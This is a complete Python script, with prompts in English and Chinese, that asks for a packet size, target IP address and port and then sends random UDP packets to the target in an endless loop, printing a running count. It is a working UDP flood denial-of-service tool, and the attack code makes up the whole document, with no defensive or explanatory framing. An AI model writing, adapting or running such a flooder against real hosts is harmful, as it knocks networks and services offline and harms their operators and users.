import sys
import socket
import random
print("Tip: press Ctrl + C to end the contract\n")
print("提示：按下Ctrl+C可以结束发包\n")
bit = int(input("send bit(请根据自己网络实际填写):"))
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(bit)
ip = str(input("IP Target : "))
port = int(input("Port       : "))
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("Sent %s"%(sent))
